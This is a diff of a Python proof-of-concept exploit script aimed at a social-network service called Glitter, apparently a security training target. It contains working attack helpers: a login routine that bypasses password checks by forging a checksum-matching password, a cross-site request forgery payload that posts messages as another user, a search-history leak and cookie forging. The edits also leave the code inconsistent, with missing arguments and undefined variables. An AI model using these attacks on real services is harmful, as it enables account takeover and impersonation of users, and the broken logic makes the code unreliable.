@@ -6,19 +6,8 @@ import hashlib
 SERVER_PORT = 1336
 SERVER_IP = "44.224.228.136"
 URL = "http://glitter.org.il/"
-DEFAULT_HEADERS = {
-    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
-    'Accept': 'application/json, text/plain, */*',
-    'Content-Type': 'application/json',
-    'Origin': URL,
-    'Accept-Encoding': 'gzip, deflate',
-    'Accept-Language': 'he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7',
-    'Connection': 'keep-alive',
-}
+DEFAULT_HEADERS = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36', 'Accept': 'application/json, text/plain, */*', 'Content-Type': 'application/json', 'Origin': URL, 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7', 'Connection': 'keep-alive',}
 
-# Global variables used across the module. These are populated during
-# the login process and reused by the various PoC helper functions so
-# callers don't need to pass them around.
 
 sock = None
 user_id = None
@@ -95,75 +84,39 @@ def connect_to_server():
     return sock
 
 
-def login_with_checksum_bypass(login_username, login_password=None):
-    """Login to the server and automatically handle the checksum step.
-
-    If ``login_password`` is ``None`` the function behaves like the old
-    bypass flow where a dummy password is used in order to calculate the
-    required checksum and construct a matching password. When a password is
-    supplied the function will authenticate with that password and submit the
-    checksum returned by the server automatically.
-
-    Parameters
-    ----------
-    login_username : str
-        Username to log in with.
-    login_password : str, optional
-        Password to use. When ``None`` a dummy password is generated to bypass
-        the checksum requirement.
-
-    Returns
-    -------
-    tuple
-        ``(sock, user_id)`` if authentication succeeds.
+def login_with_checksum_bypass(login_username, login_password):
     """
-
+    a function to login into the server (without password)
+    :param login_password:
+    :param login_username: the username of the profile we want to log into
+    :type login_username: str
+    :return: the conversation socket and the user id (if found)
+    :rtype: tuple
+    """
     connect_to_server()
-
     if login_password is None:
         dummy_password = "~*`'>``~"
-        login_msg = (
-            '100#{gli&&er}{"user_name":"'
-            + login_username
-            + '","password":"'
-            + dummy_password
-            + '","enable_push_notifications":true}##'
-        )
+        login_msg = ('100#{gli&&er}{"user_name":"' + login_username + '","password":"' + dummy_password + '","enable_push_notifications":true}##')
     else:
-        login_msg = (
-            '100#{gli&&er}{"user_name":"'
-            + login_username
-            + '","password":"'
-            + login_password
-            + '","enable_push_notifications":true}##'
-        )
-
+        login_msg = ('100#{gli&&er}{"user_name":"' + login_username + '","password":"' + login_password + '","enable_push_notifications":true}##')
     response = send_and_receive_app(login_msg)
     print("Response: " + response)
-
     if "ascii checksum:" in response:
         checksum_start = response.find("ascii checksum: ") + 16
         checksum_end = response.find("{", checksum_start)
         required_checksum = int(response[checksum_start:checksum_end])
         print("Server requires checksum: " + str(required_checksum))
-
         if login_password is None:
-            current_sum = calculate_checksum(login_username, "")
+            current_sum = calculate_checksum()
             needed_for_password = required_checksum - current_sum
             if needed_for_password > 0:
                 if needed_for_password < 127:
-                    password = chr(needed_for_password)
+                    temp_password = chr(needed_for_password)
                 else:
-                    password = "a" * (needed_for_password // 97)
+                    temp_password = "a" * (needed_for_password // 97)
             else:
-                password = "1"
-            login_msg = (
-                '100#{gli&&er}{"user_name":"'
-                + login_username
-                + '","password":"'
-                + password
-                + '","enable_push_notifications":true}##'
-            )
+                temp_password = "1"
+            login_msg = ('100#{gli&&er}{"user_name":"' + login_username + '","password":"' + temp_password + '","enable_push_notifications":true}##')
             response = send_and_receive_app(login_msg)
             print("Login response: " + response)
             if "Please complete ascii checksum" in response:
@@ -171,16 +124,11 @@ def login_with_checksum_bypass(login_username, login_password=None):
                 response = send_and_receive_app(checksum_msg)
                 print("Authentication response: " + response)
         else:
-            checksum_msg = '110#{gli&&er}' + str(required_checksum) + '##'
-            response = send_and_receive_app(checksum_msg)
-            print("Authentication response: " + response)
-
-        if "Authentication approved" in response:
-            print("Successfully logged in!")
-            id_start = response.find('"id":') + 5
-            id_end = response.find(',', id_start)
-            user_id = response[id_start:id_end]
-
+            if "Authentication approved" in response:
+                print("Successfully logged in!")
+                id_start = response.find('"id":') + 5
+                id_end = response.find(',', id_start)
+                user_id = response[id_start:id_end]
     return sock, user_id
 
 
@@ -336,8 +284,8 @@ def send_multiple_wows(glit_id, count):
         time.sleep(0.5)
 
 
-def xsrf_send_message_to_yourself_from_another_user(publisher_id):
-    msg = """<img src="http://glitter.org.il/glit?id=-1&feed_owner_id=""" + user_id + """&publisher_id=""" + publisher_id + """&publisher_screen_name=hacked_user&publisher_avatar=im1&background_color=White&date=""" + current_time + """&content=I_was_hacked&font_color=black">"""
+def xsrf_send_message_to_yourself_from_another_user():
+    msg = """<img src="http://glitter.org.il/glit?id=-1&feed_owner_id=""" + str(user_id) + """&publisher_id=""" + str(target_user_id) + """&publisher_screen_name=hacked_user&publisher_avatar=im1&background_color=White&date=""" + str(current_time) + """&content=I_was_hacked&font_color=black">"""
     send_and_receive_website("GET", "glit?id=-1&feed_owner_id=23695&publisher_id=23695&publisher_screen_name=kolin%20pom&publisher_avatar=im1&background_color=White&date=2025-07-08T16:50:31.133Z&content=" + msg + "&font_color=black")
 
 
@@ -375,7 +323,7 @@ def load_another_user_search_history():
     response = send_and_receive_website("GET", path, None, None, None)
 
 
-def generate_cookie():
+def generate_cookie(target_username):
     now = time.now()
     date_str = now.strftime("%d%m%Y")
     hour = str(int(now.strftime("%H")))
